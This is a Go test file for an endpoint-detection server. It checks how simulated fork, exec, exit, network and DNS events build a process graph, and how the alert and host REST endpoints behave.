		{EventID: "exec-snap", HostID: "h-snap-seed", TimestampNs: now, EventType: "exec",
			Payload: json.RawMessage(`{"pid":5555,"ppid":1,"path":"/usr/libexec/sd","args":[],"snapshot":true}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-snap-seed", 5555, now+1)
		if err != nil || p == nil {
			return false
		}
		return p.Process.IsSnapshot && p.Process.LastSeenNs != nil && *p.Process.LastSeenNs == now
	}, 5*time.Second, 50*time.Millisecond, "snapshot insert must seed last_seen_ns to fork_time_ns")
}

// spec:server-process-graph-builder/exit-before-snapshot-exec-race-buffer/exit-arrives-before-its-companion-snapshot-exec
func TestGraph_PendingExitConsumedBySnapshotExec(t *testing.T) {
	// Issue #176: a NOTIFY_EXIT for a snapshot-window PID can land at the server BEFORE
	// the snapshot exec arrives (post-restart race). The server's handleExit no-ops
	// (no row), buffers the exit in pendingExits, and the inbound snapshot exec consumes
	// the buffer to synthesise a row that's already exited rather than a phantom alive row.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	// Critical: exit timestamp PRECEDES exec timestamp in event terms, but both ingest in
	// the same batch. The graph builder sorts by timestamp, so the exit gets processed
	// first, buffers, then the snapshot exec consumes.
	insertEventsViaIngest(ctx, t, d, "h-pending-exit", []api.Event{
		{EventID: "exit-first", HostID: "h-pending-exit", TimestampNs: now, EventType: "exit",
			Payload: json.RawMessage(`{"pid":9876,"exit_code":0}`)},
		{EventID: "exec-snap-after", HostID: "h-pending-exit", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":9876,"ppid":1,"path":"/bin/ghost","args":[],"snapshot":true}`)},
	})

	require.Eventually(t, func() bool {
		// Query at the exit time itself: the consumed-pending-exit path pulls fork_time
		// back to exit_time, so the row's lifetime is zero. GetProcessByPID requires
		// fork_time_ns <= atTimeNs AND exit_time_ns >= atTimeNs, both satisfied at exactly
		// the exit timestamp.
		p, err := d.Service().GetProcessDetail(ctx, "h-pending-exit", 9876, now)
		if err != nil || p == nil {
			return false
		}
		if p.Process.ExitTimeNs == nil || *p.Process.ExitTimeNs != now {
			return false
		}
		if p.Process.ForkTimeNs != now {
			return false
		}
		// Reason must be "event" (collapsed from the exit payload), not the TTL synthetic one.
		return p.Process.ExitReason != nil && *p.Process.ExitReason == api.ExitReasonEvent
	}, 5*time.Second, 50*time.Millisecond, "snapshot exec must consume pending exit and mark the row exited at insert time")
}

func TestGraph_SnapshotDoesNotClobberLiveRow(t *testing.T) {
	t.Parallel()
	// Issue #11 review (Copilot): the extension's startup snapshot pass enumerates
	// the live process table after es_subscribe completes. Any process that exec'd
	// in the small window between subscribe and snapshot emission shows up TWICE:
	// once as a live ESF exec (rich payload: args, code_signing, sha256) and once
	// as a snapshot exec (sparse: snapshot=true, no args, no signing). Without
	// special-casing, the graph builder's re-exec branch (issue #10) would close
	// the live row and replace it with the sparse snapshot row. Verify that the
	// live row is preserved instead.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-snap-dedup", []api.Event{
		// Live ESF: fork + exec with rich payload.
		{EventID: "fork-live", HostID: "h-snap-dedup", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":7777,"parent_pid":1}`)},
		{EventID: "exec-live", HostID: "h-snap-dedup", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":7777,"ppid":1,"path":"/usr/bin/live","args":["live","--flag"],` +
				`"uid":501,"gid":20,"code_signing":{"team_id":"ABC","signing_id":"com.example.live",` +
				`"flags":0,"is_platform_binary":false},"sha256":"deadbeef"}`)},
		// Snapshot pass for the SAME pid, sparse payload, snapshot=true. Arrives later.
		{EventID: "exec-snap", HostID: "h-snap-dedup", TimestampNs: now + 2, EventType: "exec",
			Payload: json.RawMessage(`{"pid":7777,"ppid":1,"path":"/usr/bin/live","args":[],` +
				`"uid":501,"gid":20,"snapshot":true}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-snap-dedup", 7777, now+5)
		if err != nil || p == nil {
			return false
		}
		// Live row must survive: sha256 set, previous_exec_id nil (NOT re-exec'd),
		// args preserved.
		if p.Process.SHA256 == nil || *p.Process.SHA256 != "deadbeef" {
			return false
		}
		if p.Process.PreviousExecID != nil {
			return false
		}
		return len(p.ReExecChain) == 0
	}, 5*time.Second, 50*time.Millisecond, "snapshot exec must not re-exec-chain over a live row")
}

// spec:server-process-graph-builder/same-pid-re-exec-chain/a-shell-exec-optimization-chain-runs-on-one-pid
// spec:server-rest-api/per-process-detail-with-re-exec-chain/an-operator-inspects-a-process-detail
//
// Two scenarios share this test. The graph-builder spec scenario covers the WRITE path (the builder closes the prior
// generation and links the new one via previous_exec_id). The REST API spec scenario covers the READ path (the
// ProcessDetail handler returns a non-empty ReExecChain). The test's assertion on `len(p.ReExecChain) >= 1`
// demonstrates both clauses against one fixture; if a regression broke either side (writer linking OR reader join),
// the same assertion fires.
func TestGraph_SamePIDReExec(t *testing.T) {
	t.Parallel()
	// Issue #10: shell exec-optimization. python -> sh -c "<binary>" re-execs the binary on the SAME pid without forking. The builder must
	// close the prior generation and link the new one via previous_exec_id.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-reexec", []api.Event{
		{EventID: "fork-py", HostID: "h-reexec", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h-reexec", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3"}`)},
		{EventID: "fork-sh", HostID: "h-reexec", TimestampNs: now + 2, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "h-reexec", TimestampNs: now + 3, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","/tmp/p"]}`)},
		// Same PID re-exec into /tmp/p:
		{EventID: "exec-payload", HostID: "h-reexec", TimestampNs: now + 4, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/tmp/p"}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-reexec", 100, now+5)
		if err != nil || p == nil {
			return false
		}
		// Current generation should be /tmp/p with a previous_exec_id
		// pointing at the closed /bin/sh row.
		return p.Process.Path == "/tmp/p" && p.Process.PreviousExecID != nil &&
			len(p.ReExecChain) >= 1
	}, 5*time.Second, 50*time.Millisecond, "re-exec must chain via previous_exec_id")
}

// spec:server-process-graph-builder/timestamp-ordered-batch-processing/events-arrive-out-of-order-in-a-batch
//
// Post fork+exec+exit for the same PID with the events SHUFFLED in the batch array (exit first, then fork, then exec)
// but their timestamps in strict T1 < T2 < T3 order. The builder must sort by timestamp before applying, so the final
// row state is the same as if the events had been delivered in timestamp order: a row with the fork's parent linkage,
// the exec's image metadata, and the exit's exit_time + exit_code.
func TestGraph_OutOfOrderBatchProcessing(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	// Submitted in EXIT, FORK, EXEC order; timestamps say FORK happens at T1, EXEC at T2, EXIT at T3.
	insertEventsViaIngest(ctx, t, d, "h-order", []api.Event{
		{EventID: "exit-ooo", HostID: "h-order", TimestampNs: now + 2, EventType: "exit",
			Payload: json.RawMessage(`{"pid":4040,"exit_code":42}`)},
		{EventID: "fork-ooo", HostID: "h-order", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":4040,"parent_pid":7}`)},
		{EventID: "exec-ooo", HostID: "h-order", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":4040,"ppid":7,"path":"/bin/ooo","args":["ooo"]}`)},
	})

	// Read AT the exit timestamp (inclusive) so GetProcessByPID's "(exit_time_ns IS NULL OR exit_time_ns >= ?)" clause
	// still matches the exited row. Reading after the exit timestamp would return nil because the row is no longer
	// "alive at atTime."
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-order", 4040, now+2)
		if err != nil || p == nil {
			return false
		}
		// All three event types must have applied to the same row regardless of batch-array order.
		return p.Process.PPID == 7 &&
			p.Process.Path == "/bin/ooo" &&
			p.Process.ExitTimeNs != nil && *p.Process.ExitTimeNs == now+2 &&
			p.Process.ExitCode != nil && *p.Process.ExitCode == 42
	}, 5*time.Second, 50*time.Millisecond,
		"out-of-order batch must materialise the same row as if events were applied in timestamp order")
}

// spec:server-process-graph-builder/fork-creates-a-process-record/a-daemon-forks-a-worker
//
// Post ONLY a fork (no exec, no exit) and assert the row has: parent_pid set, fork_time_ns set, NO exec metadata
// (Path empty, ExecTimeNs nil), NO exit metadata (ExitTimeNs nil). Pins the fork-creates-record clause tightly against
// a future refactor that, say, lazily fills exec_time_ns from a placeholder. TestGraph_BuildsTreeFromExecBatch covers
// fork+exec end-to-end but does not pin the fork-only intermediate state.
func TestGraph_ForkAloneCreatesRecord(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	forkTime := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-fork-only", []api.Event{
		{EventID: "fork-alone", HostID: "h-fork-only", TimestampNs: forkTime, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":7777,"parent_pid":1}`)},
	})

	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-fork-only", 7777, forkTime+1)
		return err == nil && p != nil && p.Process.ForkTimeNs == forkTime
	}, 5*time.Second, 50*time.Millisecond, "fork must materialise a row at the fork timestamp")

	p, err := d.Service().GetProcessDetail(ctx, "h-fork-only", 7777, forkTime+1)
	require.NoError(t, err)
	require.NotNil(t, p)
	assert.Equal(t, 1, p.Process.PPID, "parent_pid from the fork event lands on the row")
	assert.Equal(t, forkTime, p.Process.ForkTimeNs, "fork_time_ns from the fork event lands on the row")
	assert.Empty(t, p.Process.Path, "no exec yet -> Path is empty")
	assert.Nil(t, p.Process.ExecTimeNs, "no exec yet -> ExecTimeNs is nil")
	assert.Nil(t, p.Process.ExitTimeNs, "no exit yet -> ExitTimeNs is nil")
}

// spec:server-process-graph-builder/pid-reuse-creates-a-new-generation/a-new-fork-lands-on-a-stale-pid
//
// OS PIDs get reused. The builder must detect a fork landing on a PID that still has a non-exited record, close the
// prior generation at the new fork's timestamp, and create a new record for the new generation. Reading at a time
// inside the old generation's lifetime returns the closed row; reading after the new fork returns the new row.
//
// Distinguished from the same-PID re-exec scenario (TestGraph_SamePIDReExec) by the event type: this one is
// fork-on-existing-fork, that one is exec-on-existing-exec.
func TestGraph_PIDReuseCreatesNewGeneration(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	t1 := time.Now().UnixNano()
	t2 := t1 + 1
	t3 := t1 + 100
	insertEventsViaIngest(ctx, t, d, "h-reuse", []api.Event{
		// Generation 1: fork(pid=8080, parent=1), exec(pid=8080, path=/bin/old).
		{EventID: "fork-g1", HostID: "h-reuse", TimestampNs: t1, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":8080,"parent_pid":1}`)},
		{EventID: "exec-g1", HostID: "h-reuse", TimestampNs: t2, EventType: "exec",
			Payload: json.RawMessage(`{"pid":8080,"ppid":1,"path":"/bin/old"}`)},
		// Generation 2: fork(pid=8080, parent=999) WITHOUT a prior exit; OS PID got recycled.
		{EventID: "fork-g2", HostID: "h-reuse", TimestampNs: t3, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":8080,"parent_pid":999}`)},
	})

	// Read AFTER the new fork lands: GetProcessByPID returns the new generation (parent=999).
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-reuse", 8080, t3+1)
		return err == nil && p != nil && p.Process.PPID == 999 && p.Process.ForkTimeNs == t3
	}, 5*time.Second, 50*time.Millisecond, "new generation must be visible at t3")

	// Read INSIDE the old generation's lifetime (t2): returns the old row, which the new fork should have closed.
	// The close stamps exit_time_ns at the new fork's timestamp so the row's lifetime is bounded.
	oldGen, err := d.Service().GetProcessDetail(ctx, "h-reuse", 8080, t2)
	require.NoError(t, err)
	require.NotNil(t, oldGen)
	assert.Equal(t, 1, oldGen.Process.PPID, "old generation has parent=1")
	assert.Equal(t, "/bin/old", oldGen.Process.Path, "old generation's exec path")
	require.NotNil(t, oldGen.Process.ExitTimeNs, "old generation must be closed when the new fork lands")
	assert.Equal(t, t3, *oldGen.Process.ExitTimeNs, "exit_time_ns lands at the new fork's timestamp")
}

// spec:server-process-graph-builder/network-and-dns-events-are-linked-to-the-process-at-event-time/a-short-lived-process-opens-a-connection
//
// network_connect + dns_query events are linked to the process record alive on (host, pid) at the event's timestamp.
// The lifetime constraint is the load-bearing piece: an event whose timestamp falls AFTER the process's exit MUST NOT
// be linked to it; conversely, an event whose timestamp falls BEFORE the process's fork MUST NOT be linked either.
//
// This test exercises the happy path (all events inside the lifetime) and asserts ProcessDetail surfaces them.
// A future enhancement could add negative cases (network event before fork / after exit) but the lifetime predicate
// is the same SQL clause in both directions; the positive case is sufficient to pin the marker.
func TestGraph_NetworkAndDNSLinkedAtEventTime(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	now := time.Now().UnixNano()
	insertEventsViaIngest(ctx, t, d, "h-netdns", []api.Event{
		{EventID: "fork-nd", HostID: "h-netdns", TimestampNs: now, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":6060,"parent_pid":1}`)},
		{EventID: "exec-nd", HostID: "h-netdns", TimestampNs: now + 1, EventType: "exec",
			Payload: json.RawMessage(`{"pid":6060,"ppid":1,"path":"/bin/netdns"}`)},
		{EventID: "net-nd", HostID: "h-netdns", TimestampNs: now + 2, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":6060,"protocol":"tcp","direction":"outbound","remote_address":"1.2.3.4","remote_port":443}`)},
		{EventID: "dns-nd", HostID: "h-netdns", TimestampNs: now + 3, EventType: "dns_query",
			Payload: json.RawMessage(`{"pid":6060,"query_name":"evil.example","query_type":"A"}`)},
		{EventID: "exit-nd", HostID: "h-netdns", TimestampNs: now + 4, EventType: "exit",
			Payload: json.RawMessage(`{"pid":6060,"exit_code":0}`)},
	})

	// Read AT exit time (inclusive); reading after would return nil because GetProcessByPID's WHERE clause is
	// "(exit_time_ns IS NULL OR exit_time_ns >= ?)".
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, "h-netdns", 6060, now+4)
		if err != nil || p == nil {
			return false
		}
		return p.Process.ExitTimeNs != nil &&
			len(p.NetworkConnections) >= 1 &&
			len(p.DNSQueries) >= 1
	}, 5*time.Second, 50*time.Millisecond, "network + dns events must surface on the process detail")

	p, err := d.Service().GetProcessDetail(ctx, "h-netdns", 6060, now+4)
	require.NoError(t, err)
	require.NotNil(t, p)
	require.Len(t, p.NetworkConnections, 1, "exactly the one network_connect event inside the lifetime")
	assert.Equal(t, "net-nd", p.NetworkConnections[0].EventID)
	require.Len(t, p.DNSQueries, 1, "exactly the one dns_query event inside the lifetime")
	assert.Equal(t, "dns-nd", p.DNSQueries[0].EventID)
}

// spec:server-process-graph-builder/snapshot-heartbeat-events-extend-the-freshness-window/heartbeat-for-an-exited-row-is-a-no-op
// spec:server-process-graph-builder/snapshot-heartbeat-events-extend-the-freshness-window/heartbeat-for-a-non-snapshot-row-is-a-no-op
//
// Two negative cases for the heartbeat update predicate, table-driven so a future contributor adds another row rather
// than another function. The heartbeat MUST be ignored when:
//
//   - The target row is snapshot-originated but has already exited (a stray heartbeat for a recycled PID must not
//     resurrect the exited row).
//   - The target row is NOT snapshot-originated (organic fork+exec rows are TTL-managed differently and must not be
//     surprised by a heartbeat from the snapshot path).
//
// The positive case (heartbeat bumps freshness on a live snapshot row) is pinned by
// TestGraph_SnapshotHeartbeatBumpsLastSeen.
func TestGraph_SnapshotHeartbeatNoOps(t *testing.T) {
	t.Parallel()
	type setup struct {
		execPayload string
		exitPayload string // empty when the row should remain alive at heartbeat time
	}
	// Both subtests use the same assertion shape (snapshot last_seen_ns before + after the heartbeat, assert
	// equality), so the cases slice only differs by the row's setup (snapshot+exited vs organic+alive). An earlier
	// version of this struct had an `initialLastSeenStillFreshAtForkTime` flag, but no subtest branched on it; the
	// field was dead code per Gemini's PR #239 review.
	cases := []struct {
		name  string
		setup setup
	}{
		{
			name: "heartbeat for exited snapshot row is a no-op",
			setup: setup{
				execPayload: `{"pid":3030,"ppid":1,"path":"/usr/libexec/exited-snap","snapshot":true}`,
				exitPayload: `{"pid":3030,"exit_code":0}`,
			},
		},
		{
			name: "heartbeat for non-snapshot row is a no-op",
			setup: setup{
				execPayload: `{"pid":3030,"ppid":1,"path":"/bin/organic"}`,
				exitPayload: "",
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
			ctx := t.Context()
			hostID := "h-hb-" + strings.ReplaceAll(strings.ReplaceAll(tc.name, " ", "-"), "/", "-")

			forkTime := time.Now().UnixNano()
			heartbeatTime := forkTime + int64(time.Hour)
			events := []api.Event{
				{EventID: "exec-" + hostID, HostID: hostID, TimestampNs: forkTime, EventType: "exec",
					Payload: json.RawMessage(tc.setup.execPayload)},
			}
			if tc.setup.exitPayload != "" {
				events = append(events, api.Event{
					EventID: "exit-" + hostID, HostID: hostID, TimestampNs: forkTime + 100, EventType: "exit",
					Payload: json.RawMessage(tc.setup.exitPayload),
				})
			}
			insertEventsViaIngest(ctx, t, d, hostID, events)

			// Read time must straddle the row's lifetime: if there's an exit, the read time is the exit time (inclusive)
			// so GetProcessByPID's "(exit_time_ns IS NULL OR exit_time_ns >= ?)" clause matches the exited row.
			// Without an exit, the row is alive forever (so any read time works); we pick heartbeatTime+1 to confirm
			// the heartbeat (which fires later) didn't move things.
			readTime := heartbeatTime + 1
			if tc.setup.exitPayload != "" {
				readTime = forkTime + 100 // = exit timestamp; inclusive read
			}

			// Wait for ALL initial events to drain through the processor before snapshotting the row. The earlier shape
			// only waited for GetProcessDetail to return non-nil, which fires as soon as the exec row exists; if the
			// exit event hasn't been processed yet, `before` ends up with ExitTimeNs=nil and the post-heartbeat snapshot
			// (taken after the processor catches up) shows ExitTimeNs set, which then trips the "heartbeat MUST NOT
			// change exit_time_ns" assertion against the heartbeat for an exit the heartbeat had nothing to do with.
			// Gating on CountUnprocessed==0 ensures both the exec and the exit (when there is one) are durably reflected
			// in the read model before the snapshot. Pre-existing race surfaced on PR #281.
			require.Eventually(t, func() bool {
				n, err := d.Store().CountUnprocessed(ctx)
				if err != nil || n != 0 {
					return false
				}
				p, err := d.Service().GetProcessDetail(ctx, hostID, 3030, readTime)
				return err == nil && p != nil
			}, 5*time.Second, 25*time.Millisecond, "initial events must drain and the row must be visible before snapshot")

			// Snapshot the row's pre-heartbeat state.
			before, err := d.Service().GetProcessDetail(ctx, hostID, 3030, readTime)
			require.NoError(t, err)
			require.NotNil(t, before)

			// Send the heartbeat. The whole point of the test is that this is a no-op for the row.
			insertEventsViaIngest(ctx, t, d, hostID, []api.Event{
				{EventID: "hb-" + hostID, HostID: hostID, TimestampNs: heartbeatTime, EventType: "snapshot_heartbeat",
					Payload: json.RawMessage(`{"pid":3030}`)},
			})

			// Wait for the heartbeat event to be processed (CountUnprocessed == 0).
			require.Eventually(t, func() bool {
				n, err := d.Store().CountUnprocessed(ctx)
				return err == nil && n == 0
			}, 5*time.Second, 25*time.Millisecond, "heartbeat event must reach the processor")

			after, err := d.Service().GetProcessDetail(ctx, hostID, 3030, readTime)
			require.NoError(t, err)
			require.NotNil(t, after)

			// LastSeenNs is the field the heartbeat would have advanced; on a no-op it stays equal to before.
			assert.Equal(t, before.Process.LastSeenNs, after.Process.LastSeenNs,
				"heartbeat MUST NOT advance last_seen_ns for an exited snapshot row or a non-snapshot row")
			// Exit metadata must not be invented: a heartbeat must not resurrect or close a row.
			assert.Equal(t, before.Process.ExitTimeNs, after.Process.ExitTimeNs,
				"heartbeat MUST NOT change exit_time_ns")
		})
	}
}

// ---- Operator HTTP handler -------------------------------------------------

// spec:server-rest-api/list-enrolled-hosts/an-operator-opens-the-hosts-dashboard
// spec:server-rest-api/json-response-format-and-error-shape/a-successful-response-is-json
//
// Two scenarios share this test: list-enrolled-hosts is the obvious one (the test asserts the hosts dashboard payload
// shape); the JSON-response-shape scenario is satisfied incidentally because this happy-path 200 returns a JSON body
// matching the documented schema. If a regression switched the response Content-Type or removed the JSON wrapper,
// this test's json.Decode call would fail.
func TestOperatorHTTP_ListHosts(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	require.NoError(t, d.Service().RecordHostSeen(t.Context(), "host-1", time.Now()))

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
	var hosts []api.HostSummary
	require.NoError(t, json.NewDecoder(resp.Body).Decode(&hosts))
	assert.Len(t, hosts, 1)
}

func TestOperatorHTTP_ListAlerts_Empty(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet,
		srv.URL+"/api/alerts?status=open&host_id=h&severity=high&limit=10&process_id=1", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
	var alerts []api.Alert
	require.NoError(t, json.NewDecoder(resp.Body).Decode(&alerts))
	assert.Empty(t, alerts)
}

// TestOperatorHTTP_ListAlerts_SourceFilter pins the GET /api/alerts ?source= query-param contract end to end. The UI's alert-list
// source filter relies on the handler parsing the param and the store applying it to the WHERE clause; dropping either layer would
// silently regress the "filter by app-control vs detection" demo beat, which is precisely what step 9 exists to land.
func TestOperatorHTTP_ListAlerts_SourceFilter(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	procID := mustInsertProcess(t, ctx, d, "host-a", 100)

	// One alert per source value so the same row set covers both filter branches in one HTTP test. Seed via the store rather
	// than the engine path: insertAlertDirect would default Source to "detection" and we'd need a separate stubRule that emits an
	// application_control finding just to seed the second row. Direct InsertAlert keeps the test focused on the filter wiring, not on
	// engine internals.
	for _, source := range []string{api.AlertSourceDetection, api.AlertSourceApplicationControl} {
		_, _, err := d.Store().InsertAlert(ctx, api.Alert{
			HostID:    "host-a",
			RuleID:    source + ":seed",
			Source:    source,
			Severity:  rulesapi.SeverityMedium,
			Title:     source + " seed",
			ProcessID: procID,
		}, nil)
		require.NoError(t, err)
	}

	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	listWithSource := func(t *testing.T, source string) []api.Alert {
		t.Helper()
		u := srv.URL + "/api/alerts"
		if source != "" {
			u += "?source=" + source
		}
		req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, u, nil)
		require.NoError(t, err)
		resp, err := srv.Client().Do(req)
		require.NoError(t, err)
		defer resp.Body.Close()
		require.Equal(t, http.StatusOK, resp.StatusCode)
		var alerts []api.Alert
		require.NoError(t, json.NewDecoder(resp.Body).Decode(&alerts))
		return alerts
	}

	t.Run("no filter returns both sources", func(t *testing.T) {
		assert.Len(t, listWithSource(t, ""), 2)
	})
	t.Run("source=detection returns only the detection alert", func(t *testing.T) {
		got := listWithSource(t, api.AlertSourceDetection)
		require.Len(t, got, 1)
		assert.Equal(t, api.AlertSourceDetection, got[0].Source)
	})
	t.Run("source=application_control returns only the app-control alert", func(t *testing.T) {
		got := listWithSource(t, api.AlertSourceApplicationControl)
		require.Len(t, got, 1)
		assert.Equal(t, api.AlertSourceApplicationControl, got[0].Source)
	})
	t.Run("unknown source returns empty", func(t *testing.T) {
		assert.Empty(t, listWithSource(t, "no_such_source"))
	})
}

// spec:server-rest-api/alert-detail-with-linked-event-ids/the-alert-id-is-unknown
func TestOperatorHTTP_GetAlert_NotFound(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/alerts/99999", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusNotFound, resp.StatusCode)
}

// Pins that a malformed alert-id path-param returns 400. The marker for the spec scenario
// "json-response-format-and-error-shape/an-endpoint-returns-an-error" is intentionally NOT on this test: the
// operator handler currently emits plain-text via http.Error, while the spec requires JSON {"error": "code"} for
// every 4xx/5xx. That is real spec/impl drift, tracked as a v0.1.0 follow-up; the marker will land here once the
// handler is converted to the JSON error shape and this test asserts the body, not just the status code.
func TestOperatorHTTP_GetAlert_BadID(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/alerts/notanumber", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)
}

// spec:server-rest-api/update-alert-lifecycle-status/an-operator-resolves-an-alert
func TestOperatorHTTP_UpdateAlertStatus_HappyPath(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{
		mode:       bootstrap.ModeFull,
		userExists: stubUserExists(0), // 0 means UserExists check skipped
	})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	alertID := seedSingleAlert(t, t.Context(), d)

	body := strings.NewReader(`{"status":"acknowledged"}`)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPut,
		srv.URL+"/api/alerts/"+strconv.FormatInt(alertID, 10), body)
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusNoContent, resp.StatusCode)
}

func TestOperatorHTTP_UpdateAlertStatus_BadBody(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	body := strings.NewReader(`{not json`)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPut,
		srv.URL+"/api/alerts/1", body)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)
}

// spec:server-rest-api/update-alert-lifecycle-status/an-invalid-status-value-is-supplied
// spec:server-rest-api/json-response-format-and-error-shape/an-endpoint-returns-an-error
//
// The second marker pins the cross-cutting JSON error envelope: every endpoint in this capability MUST surface
// 4xx / 5xx with a body that parses as `{"error": "<stable typed code>"}`. The body-shape assertions below catch a
// regression where a handler returns 400 with plain-text or an empty body and silently breaks scripted clients.
func TestOperatorHTTP_UpdateAlertStatus_InvalidStatus(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	body := strings.NewReader(`{"status":"banana"}`)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPut,
		srv.URL+"/api/alerts/1", body)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)

	// Error envelope: JSON object with a stable typed `error` code so scripted clients dispatch without parsing.
	assert.Contains(t, resp.Header.Get("Content-Type"), "application/json", "error responses MUST be JSON")
	respBody, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	var parsed map[string]string
	require.NoError(t, json.Unmarshal(respBody, &parsed), "error body MUST be a parseable JSON object")
	assert.Equal(t, "invalid_status", parsed["error"],
		"JSON body MUST carry the exact stable typed code for this path so scripted clients can dispatch on it")
}

func TestOperatorHTTP_ProcessTree_RequiresHostID(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

